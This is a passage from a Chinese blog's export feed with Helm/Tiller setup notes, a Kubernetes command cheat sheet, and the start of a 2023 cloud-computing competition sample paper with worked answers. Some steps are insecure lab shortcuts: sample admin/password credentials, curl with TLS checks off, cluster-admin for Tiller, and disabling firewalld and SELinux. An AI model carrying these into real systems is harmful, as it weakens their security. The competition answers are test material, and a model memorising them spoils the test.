XDG base directory specification, the XDG variables will be used</span><br><span class="line">- When no other location is <span class="built_in">set</span> a default location will be used based on the operating system</span><br><span class="line"></span><br><span class="line">By default, the default directories depend on the Operating System. The defaults are listed below:</span><br><span class="line"></span><br><span class="line">| Operating System | Cache Path                | Configuration Path             | Data Path               |</span><br><span class="line">|------------------|---------------------------|--------------------------------|-------------------------|</span><br><span class="line">| Linux            | <span class="variable">$HOME</span>/.cache/helm         | <span class="variable">$HOME</span>/.config/helm             | <span class="variable">$HOME</span>/.local/share/helm |</span><br><span class="line">| macOS            | <span class="variable">$HOME</span>/Library/Caches/helm | <span class="variable">$HOME</span>/Library/Preferences/helm | <span class="variable">$HOME</span>/Library/helm      |</span><br><span class="line">| Windows          | %TEMP%\helm               | %APPDATA%\helm                 | %APPDATA%\helm          |</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  helm [<span class="built_in">command</span>]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  completion  generate autocompletion scripts <span class="keyword">for</span> the specified shell</span><br><span class="line">  create      create a new chart with the given name</span><br><span class="line">  dependency  manage a chart<span class="string">&#x27;s dependencies</span></span><br><span class="line"><span class="string">  env         helm client environment information</span></span><br><span class="line"><span class="string">  get         download extended information of a named release</span></span><br><span class="line"><span class="string">  help        Help about any command</span></span><br><span class="line"><span class="string">  history     fetch release history</span></span><br><span class="line"><span class="string">  install     install a chart</span></span><br><span class="line"><span class="string">  lint        examine a chart for possible issues</span></span><br><span class="line"><span class="string">  list        list releases</span></span><br><span class="line"><span class="string">  package     package a chart directory into a chart archive</span></span><br><span class="line"><span class="string">  plugin      install, list, or uninstall Helm plugins</span></span><br><span class="line"><span class="string">  pull        download a chart from a repository and (optionally) unpack it in local directory</span></span><br><span class="line"><span class="string">  repo        add, list, remove, update, and index chart repositories</span></span><br><span class="line"><span class="string">  rollback    roll back a release to a previous revision</span></span><br><span class="line"><span class="string">  search      search for a keyword in charts</span></span><br><span class="line"><span class="string">  show        show information of a chart</span></span><br><span class="line"><span class="string">  status      display the status of the named release</span></span><br><span class="line"><span class="string">  template    locally render templates</span></span><br><span class="line"><span class="string">  test        run tests for a release</span></span><br><span class="line"><span class="string">  uninstall   uninstall a release</span></span><br><span class="line"><span class="string">  upgrade     upgrade a release</span></span><br><span class="line"><span class="string">  verify      verify that a chart at the given path has been signed and is valid</span></span><br><span class="line"><span class="string">  version     print the client version information</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Flags:</span></span><br><span class="line"><span class="string">      --debug                       enable verbose output</span></span><br><span class="line"><span class="string">  -h, --help                        help for helm</span></span><br><span class="line"><span class="string">      --kube-apiserver string       the address and the port for the Kubernetes API server</span></span><br><span class="line"><span class="string">      --kube-as-group stringArray   group to impersonate for the operation, this flag can be repeated to specify multiple groups.</span></span><br><span class="line"><span class="string">      --kube-as-user string         username to impersonate for the operation</span></span><br><span class="line"><span class="string">      --kube-ca-file string         the certificate authority file for the Kubernetes API server connection</span></span><br><span class="line"><span class="string">      --kube-context string         name of the kubeconfig context to use</span></span><br><span class="line"><span class="string">      --kube-token string           bearer token used for authentication</span></span><br><span class="line"><span class="string">      --kubeconfig string           path to the kubeconfig file</span></span><br><span class="line"><span class="string">  -n, --namespace string            namespace scope for this request</span></span><br><span class="line"><span class="string">      --registry-config string      path to the registry config file (default &quot;/root/.config/helm/registry.json&quot;)</span></span><br><span class="line"><span class="string">      --repository-cache string     path to the file containing cached repository indexes (default &quot;/root/.cache/helm/repository&quot;)</span></span><br><span class="line"><span class="string">      --repository-config string    path to the file containing repository names and URLs (default &quot;/root/.config/helm/repositories.yaml&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use &quot;helm [command] --help&quot; for more information about a command.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h3 id="Helm-服务端安装Tiller"><a href="#Helm-服务端安装Tiller" class="headerlink" title="Helm 服务端安装Tiller"></a>Helm 服务端安装Tiller</h3><p>注意:现在K8S集群上每个节点安装socat软件(yum install -y socat),不然会报错:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E0522 22:22:15.492436   24409 portforward.go:331] an error occurred forwarding 38398 -&gt; 44134: error forwarding port 44134 to pod dc6da4ab99ad9c497c0cef1776b9dd18e0a612d507e2746ed63d36ef40f30174, uid : unable to do port forwarding: socat not found.</span><br><span class="line">Error: cannot connect to Tiller</span><br></pre></td></tr></table></figure>

<p>Tiller 是以 Deployment 方式部署在 Kubernetes 集群中的，只需使用以下指令便可简单的完成安装。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">helm init</span><br></pre></td></tr></table></figure>

<p>由于 Helm 默认会去 storage.googleapis.com 拉取镜像，如果你当前执行的机器不能访问该域名的话可以使用以下命令来安装：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">helm init --client-only --stable-repo-url https://aliacs-app-catalog.oss-cn-hangzhou.aliyuncs.com/charts/</span><br><span class="line">helm repo add incubator https://aliacs-app-catalog.oss-cn-hangzhou.aliyuncs.com/charts-incubator/</span><br><span class="line">helm repo update</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建服务端</span></span><br><span class="line">helm init --service-account tiller --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1  --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建TLS认证服务端，参考地址：https://github.com/gjmzj/kubeasz/blob/master/docs/guide/helm.md</span></span><br><span class="line">helm init --service-account tiller --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1 --tiller-tls-cert /etc/kubernetes/ssl/tiller001.pem --tiller-tls-key /etc/kubernetes/ssl/tiller001-key.pem --tls-ca-cert /etc/kubernetes/ssl/ca.pem --tiller-namespace kube-system --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts</span><br></pre></td></tr></table></figure>

<p>在 Kubernetes 中安装 Tiller 服务，因为官方的镜像因为某些原因无法拉取，使用-i指定自己的镜像，可选镜像：registry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;tiller:v2.9.1（阿里云），该镜像的版本与helm客户端的版本相同，使用helm version可查看helm客户端版本。</p>
<h3 id="给Tiller授权"><a href="#给Tiller授权" class="headerlink" title="给Tiller授权"></a>给Tiller授权</h3><p>因为 Helm 的服务端 Tiller 是一个部署在 Kubernetes 中 Kube-System Namespace 下 的 Deployment，它会去连接 Kube-Api 在 Kubernetes 里创建和删除应用。</p>
<p>而从 Kubernetes 1.6 版本开始，API Server 启用了 RBAC 授权。目前的 Tiller 部署时默认没有定义授权的 ServiceAccount，这会导致访问 API Server 时被拒绝。所以我们需要明确为 Tiller 部署添加授权。</p>
<p>创建 Kubernetes 的服务帐号和绑定角色</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kubectl create serviceaccount --namespace kube-system tiller</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller</span></span><br></pre></td></tr></table></figure>

<p>为 Tiller 设置帐号</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 kubectl patch 更新 API 对象</span></span><br><span class="line">$ kubectl patch deploy --namespace kube-system tiller-deploy -p <span class="string">&#x27;&#123;&quot;spec&quot;:&#123;&quot;template&quot;:&#123;&quot;spec&quot;:&#123;&quot;serviceAccount&quot;:&quot;tiller&quot;&#125;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">deployment.extensions <span class="string">&quot;tiller-deploy&quot;</span> patched</span><br></pre></td></tr></table></figure>

<p>查看是否授权成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kubectl get deploy --namespace kube-system   tiller-deploy  --output yaml|grep  serviceAccount</span></span><br><span class="line">serviceAccount: tiller</span><br><span class="line">serviceAccountName: tiller</span><br></pre></td></tr></table></figure>

<h3 id="验证-Tiller-是否安装成功"><a href="#验证-Tiller-是否安装成功" class="headerlink" title="验证 Tiller 是否安装成功"></a>验证 Tiller 是否安装成功</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kubectl -n kube-system get pods|grep tiller</span></span><br><span class="line">tiller-deploy-6d68f5c78f-nql2z          1/1       Running   0          5m</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">helm version</span></span><br><span class="line">Client: &amp;version.Version&#123;SemVer:&quot;v2.9.1&quot;, GitCommit:&quot;20adb27c7c5868466912eebdf6664e7390ebe710&quot;, GitTreeState:&quot;clean&quot;&#125;</span><br><span class="line">Server: &amp;version.Version&#123;SemVer:&quot;v2.9.1&quot;, GitCommit:&quot;20adb27c7c5868466912eebdf6664e7390ebe710&quot;, GitTreeState:&quot;clean&quot;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Helm-常用命令"><a href="#Helm-常用命令" class="headerlink" title="Helm 常用命令"></a>Helm 常用命令</h1><p><strong>查看版本</strong></p>
<p>#helm version </p>
<p><strong>查看当前安装的charts</strong></p>
<p>#helm list</p>
<p><strong>查询 charts</strong></p>
<p>#helm search redis</p>
<p><strong>安装charts</strong></p>
<p>#helm install –name redis –namespaces prod bitnami&#x2F;redis</p>
<p><strong>查看charts状态</strong></p>
<p>#helm status redis</p>
<p><strong>删除charts</strong></p>
<p>#helm delete –purge redis</p>
<p><strong>增加repo</strong></p>
<p>#helm repo add stable <a href="https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts">https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts</a></p>
<p>#helm repo add –username admin –password password myharbor <a href="https://harbor.qing.cn/chartrepo/charts">https://harbor.qing.cn/chartrepo/charts</a></p>
<p><strong>更新repo仓库资源</strong></p>
<p>#helm repo update</p>
<p><strong>创建charts</strong></p>
<p>#helm create helm_charts</p>
<p><strong>测试charts语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#helm lint </span><br></pre></td></tr></table></figure>

<p><strong>打包charts</strong></p>
<p>#cd helm_charts &amp;&amp; helm package .&#x2F;</p>
<p><strong>查看生成的yaml文件</strong></p>
<p>#helm template helm_charts-0.1.1.tgz</p>
<p><strong>更新image</strong></p>
<p>#helm upgrade –set image.tag&#x3D;’v2019-05-09-18-48-40’ study-api-en-oral myharbor&#x2F;study-api-en-oral</p>
<p><strong>回滚relase</strong></p>
<p>#helm hist study-api-en-oral</p>
<p>#helm rollback study-api-en-oral 4</p>
<p><strong>发布到私有harbor仓库脚本</strong></p>
<p>request_url&#x3D;’<a href="https://harbor.qing.cn/api/chartrepo/charts/charts">https://harbor.qing.cn/api/chartrepo/charts/charts</a>‘</p>
<p>user_name&#x3D;’admin’</p>
<p>password&#x3D;’password’</p>
<p>chart_file&#x3D;’helm_charts-0.1.3.tgz’</p>
<p>curl -i -u “$user_name:$password” -k -X POST “${request_url}” \</p>
<p>-H “accept: application&#x2F;json” \</p>
<p>-H “Content-Type: multipart&#x2F;form-data” \</p>
<p>-F “chart&#x3D;@${chart_file};type&#x3D;application&#x2F;x-compressed”</p>
<p>echo $result</p>
]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>Helm</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Kubernetes命令总结</title>
    <url>/posts/fb59692f.html</url>
    <content><![CDATA[<h1 id="一-基础命令"><a href="#一-基础命令" class="headerlink" title="一.基础命令"></a>一.基础命令</h1><h2 id="1-状态查询"><a href="#1-状态查询" class="headerlink" title="1.状态查询"></a>1.状态查询</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看集群信息</span></span><br><span class="line">kubectl cluster<span class="literal">-info</span></span><br><span class="line"></span><br><span class="line">systemctl status kube<span class="literal">-apiserver</span></span><br><span class="line">systemctl status kubelet</span><br><span class="line">systemctl status kube<span class="literal">-proxy</span></span><br><span class="line">systemctl status kube<span class="literal">-scheduler</span></span><br><span class="line">systemctl status kube<span class="literal">-controller-manager</span></span><br><span class="line">systemctl status docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询api服务</span></span><br><span class="line">kubectl get apiservice</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-node相关"><a href="#2-node相关" class="headerlink" title="2.node相关"></a>2.node相关</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看namespaces</span></span><br><span class="line">kubectl get namespaces</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为节点增加lable</span></span><br><span class="line">kubectl label nodes <span class="number">10.126</span>.<span class="number">72.31</span> points=test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看节点和lable</span></span><br><span class="line">kubectl get nodes <span class="literal">--show-labels</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">kubectl get componentstatuses</span><br><span class="line"></span><br><span class="line"><span class="comment"># Node的隔离与恢复</span></span><br><span class="line"><span class="comment">## 隔离</span></span><br><span class="line">kubectl cordon k8s<span class="literal">-node1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 恢复</span></span><br><span class="line">kubectl uncordon k8s<span class="literal">-node1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-查询"><a href="#3-查询" class="headerlink" title="3.查询"></a>3.查询</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看nodes节点</span></span><br><span class="line">kubectl get nodes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过yaml文件查询</span></span><br><span class="line">kubectl get -f xxx-yaml/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询全部类型</span></span><br><span class="line">kubectl get all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询资源</span></span><br><span class="line">kubectl get resourcequota</span><br><span class="line"></span><br><span class="line"><span class="comment"># endpoints端</span></span><br><span class="line">kubectl get endpoints</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看pods</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看指定空间`kube-system`的pods</span></span><br><span class="line">kubectl get po -n kube-system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有空间的</span></span><br><span class="line">kubectl get pods -o wide --all-namespaces</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他的写法</span></span><br><span class="line">kubectl get pod -o wide --namespace=kube-system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取svc</span></span><br><span class="line">kubectl get svc --all-namespaces</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他写法</span></span><br><span class="line">kubectl get services --all-namespaces</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过lable查询</span></span><br><span class="line">kubectl get pods -l app=nginx -o yaml|grep podIP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当我们发现一个pod迟迟无法创建时，描述一个pods</span></span><br><span class="line">kubectl describe pod xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询事件</span></span><br><span class="line">kubectl get events --all-namespaces</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4-删除所有pod"><a href="#4-删除所有pod" class="headerlink" title="4.删除所有pod"></a>4.删除所有pod</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除所有pods</span></span><br><span class="line">kubectl delete pods --all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除所有包含某个lable的pod和serivce</span></span><br><span class="line">kubectl delete pods,services -l name=&lt;lable-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除ui server,然后重建</span></span><br><span class="line">kubectl delete deployments kubernetes-dashboard --namespace=kube-system</span><br><span class="line">kubectl delete services kubernetes-dashboard --namespace=kube-system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制删除部署</span></span><br><span class="line">kubectl delete deployment kafka-1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除rc</span></span><br><span class="line">kubectl delete rs --all &amp;&amp; kubectl delete rc --all</span><br><span class="line"></span><br><span class="line"><span class="comment">## 强制删除Terminating状态的pod</span></span><br><span class="line">kubectl delete deployment kafka-1 --grace-period=0 --force</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-滚动"><a href="#5-滚动" class="headerlink" title="5.滚动"></a>5.滚动</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#升级</span></span><br><span class="line">kubectl apply -f xxx.yaml --record</span><br><span class="line"></span><br><span class="line"><span class="comment">#回滚</span></span><br><span class="line">kubectl rollout undo deployment javademo</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看滚动升级记录</span></span><br><span class="line">kubectl rollout <span class="built_in">history</span> depolyment &#123;名称&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-查看日志"><a href="#6-查看日志" class="headerlink" title="6.查看日志"></a>6.查看日志</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看指定镜像的日志</span></span><br><span class="line">kubectl logs -f kube-dns-699984412-vz1q6 -n kube-system</span><br><span class="line"></span><br><span class="line">kubectl logs --<span class="built_in">tail</span>=10 nginx  </span><br><span class="line"></span><br><span class="line"><span class="comment">#指定其中一个查看日志</span></span><br><span class="line">kubectl logs kube-dns-699984412-n5zkz -c kubedns --namespace=kube-system</span><br><span class="line">kubectl logs kube-dns-699984412-vz1q6 -c dnsmasq --namespace=kube-system</span><br><span class="line">kubectl logs kube-dns-699984412-mqb14 -c sidecar --namespace=kube-system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 看日志</span></span><br><span class="line">journalctl -f</span><br></pre></td></tr></table></figure>

<h2 id="7-扩展"><a href="#7-扩展" class="headerlink" title="7.扩展"></a>7.扩展</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line"><span class="built_in">nohup</span> kubectl proxy --address=<span class="string">&#x27;10.1.70.247&#x27;</span> --port=8001 --accept-hosts=<span class="string">&#x27;^*$&#x27;</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入镜像</span></span><br><span class="line">kubectl <span class="built_in">exec</span> kube-dns-699984412-vz1q6 -n kube-system -c kubedns ifconfig</span><br><span class="line">kubectl <span class="built_in">exec</span> kube-dns-699984412-vz1q6 -n kube-system -c kubedns ifconfig /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行镜像内命令</span></span><br><span class="line">kubectl <span class="built_in">exec</span> kube-dns-4140740281-pfjhr -c etcd --namespace=kube-system etcdctl get /skydns/local/cluster/default/redis-master</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="8-无限循环的命令"><a href="#8-无限循环的命令" class="headerlink" title="8.无限循环的命令"></a>8.无限循环的命令</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> <span class="built_in">sleep</span> 1; <span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="9-其他"><a href="#9-其他" class="headerlink" title="9.其他"></a>9.其他</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建和删除</span></span><br><span class="line">kubectl create -f dashboard-controller.yaml</span><br><span class="line">kubectl delete -f dashboard-dashboard.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换&amp;&amp;应用</span></span><br><span class="line">kubectl apply -f xxx.yaml</span><br><span class="line">kubectl replace -f xxx.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看指定pods的环境变量</span></span><br><span class="line">kubectl <span class="built_in">exec</span> xxx <span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断dns是否通</span></span><br><span class="line">kubectl <span class="built_in">exec</span> busybox -- nslookup kube-dns.kube-system</span><br><span class="line"></span><br><span class="line"><span class="comment"># kube-proxy状态</span></span><br><span class="line">systemctl status kube-proxy -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># token的</span></span><br><span class="line">kubectl get serviceaccount/kube-dns --namespace=kube-system -o yaml|grep token</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年一带一路职业技能大赛云计算(样题)</title>
    <url>/posts/d5ee981d.html</url>
    <content><![CDATA[<h1 id="A模块题目OpenStack平台部署与运维"><a href="#A模块题目OpenStack平台部署与运维" class="headerlink" title="A模块题目OpenStack平台部署与运维"></a>A模块题目OpenStack平台部署与运维</h1><h2 id="任务-1-私有云平台环境初始化（6-分）"><a href="#任务-1-私有云平台环境初始化（6-分）" class="headerlink" title="任务 1 私有云平台环境初始化（6 分）"></a>任务 1 私有云平台环境初始化（6 分）</h2><table>
<thead>
<tr>
<th>IP</th>
<th>主机名</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.157.30</td>
<td>controller</td>
</tr>
<tr>
<td>192.168.157.31</td>
<td>compute</td>
</tr>
</tbody></table>
<h3 id="1-配置主机名"><a href="#1-配置主机名" class="headerlink" title="1.配置主机名"></a>1.配置主机名</h3><p> 把 controller 节点主机名设置为 controller, compute 节点主机名设置为 compute。</p>
<p> 分别在 controller 节点和 compute 节点将 hostname 命令的返回结果提交到答题框。【0.5 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# hostname</span><br><span class="line">controller</span><br><span class="line"></span><br><span class="line">[root@compute ~]# hostname</span><br><span class="line">compute</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname controller</span><br><span class="line"></span><br><span class="line">hostnamectl set-hostname compute</span><br></pre></td></tr></table></figure>

<h3 id="2-配置-hosts-文件"><a href="#2-配置-hosts-文件" class="headerlink" title="2.配置 hosts 文件"></a>2.配置 hosts 文件</h3><p>分别在 controller 节点和 compute 节点修改 hosts 文件将 IP 地址映射为主机名。</p>
<p>请在 controller 节点将 cat &#x2F;etc&#x2F;hosts 命令的返回结果提交到答题框。 【0.5 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.157.30 controller</span><br><span class="line">192.168.157.31 compute</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@compute ~]# <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.157.30 controller</span><br><span class="line">192.168.157.31 compute</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-挂载光盘镜像"><a href="#3-挂载光盘镜像" class="headerlink" title="3.挂载光盘镜像"></a>3.挂载光盘镜像</h3><p>将提供的 CentOS-7-x86_64-DVD-1804.iso 和 bricsskills_cloud_iaas.iso 光盘镜像移动到</p>
<p>controller 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用命令创建 centos 目录和 iaas 目录，</p>
<p>并将镜像文件 centOS-7-x86_64-DVD-1804.iso 挂载到 &#x2F;opt&#x2F;centos 目录下，将镜像文件</p>
<p>bricsskills_cloud_iaas.iso 挂载到 &#x2F;iaas 目录下。</p>
<p>请在 controller 节点将 ls &#x2F;opt&#x2F;iaas&#x2F;命令的返回结果提交到答题框。【0.5 分】</p>
<figure class="highlight plaintext"><figcaption><span>~]# ls</span><a href="/opt/iaas/">link</a></figcaption><table><tr><td class="code"><pre><span class="line">iaas-repo  images</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将指定的镜像上传至/root目录下</span></span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">挂载</span></span><br><span class="line"> </span><br><span class="line">[root@controller ~]# cat &gt;&gt; /etc/fstab &lt;&lt; EOF</span><br><span class="line">/root/CentOS-7-x86_64-DVD-1804.iso /opt/centos iso9660 defaults 0 0</span><br><span class="line">/root/chinaskills_cloud_iaas.iso /opt/iaas iso9660 defaults 0 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<h3 id="4-配置-controller-节点-yum-源"><a href="#4-配置-controller-节点-yum-源" class="headerlink" title="4.配置 controller 节点 yum 源"></a>4.配置 controller 节点 yum 源</h3><p>将 controller 节点原有的 yum 源移动到&#x2F;home 目录，</p>
<p>为 controller 节点创建本地 yum 源，</p>
<p>yum 源文件名为 local.repo。</p>
<p>请将 yum list | grep vsftpd 的返回结果提交到答题框。【0.5 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# yum list | grep vsftpd</span><br><span class="line">vsftpd.x86_64                              3.0.2-22.el7                centos</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">mkdir</span> /home/yum</span><br><span class="line">[root@controller ~]# <span class="built_in">mv</span> /etc/yum.repos.d/* /home/yum</span><br><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=file:///opt/iaas/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[root@controller ~]# yum repolist</span><br></pre></td></tr></table></figure>

<h3 id="5-搭建-ftp-服务器"><a href="#5-搭建-ftp-服务器" class="headerlink" title="5.搭建 ftp 服务器"></a>5.搭建 ftp 服务器</h3><p>在 controller 节点上安装 vsftp 服务, 将&#x2F;opt 目录设为共享，并设置为开机自启动，然后</p>
<p>重启服务生效。</p>
<p>请将 cat &#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf |grep &#x2F;opt 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]#  <span class="built_in">cat</span> /etc/vsftpd/vsftpd.conf |grep /opt</span><br><span class="line">anon_root=/opt</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# yum install -y vsftpd</span><br><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/vsftpd/vsftpd.conf</span><br><span class="line"><span class="comment">#添加</span></span><br><span class="line">anon_root=/opt</span><br><span class="line">[root@controller ~]# systemctl <span class="built_in">enable</span> vsftpd --now</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/vsftpd.service to /usr/lib/systemd/system/vsftpd.service.</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭防火墙及安全策略</span></span><br><span class="line">[root@controller ~]# systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">Removed symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.</span><br><span class="line">Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.</span><br><span class="line">[root@controller ~]# setenforce 0</span><br><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/selinux/config</span><br><span class="line">SELINUX=permissive</span><br><span class="line"></span><br><span class="line">[root@compute ~]# systemctl stop firewalld &amp;&amp; systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">Removed symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.</span><br><span class="line">Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.</span><br><span class="line">[root@compute ~]# setenforce 0</span><br><span class="line">[root@compute ~]# <span class="built_in">cat</span> /etc/selinux/config</span><br><span class="line">SELINUX=permissive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-配置-compute-节点-yum-源"><a href="#6-配置-compute-节点-yum-源" class="headerlink" title="6.配置 compute 节点 yum 源"></a>6.配置 compute 节点 yum 源</h3><p>将 compute 节点原有的 yum 源移动到&#x2F;home 目录，为 compute 节点创建 ftp 源，yum 源文件</p>
<p>名为 ftp.repo，其中 ftp 服务器为 controller 节点,配置 ftp 源时不要写 IP 地址。</p>
<p> 请将 yum list | grep xiandian 命令的返回结果提交到答题框【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@compute ~]# yum list | grep xiandian</span><br><span class="line">iaas-xiandian.x86_64                       2.4-2                       iaas-0</span><br></pre></td></tr></table></figure>

<p>解法:</p>
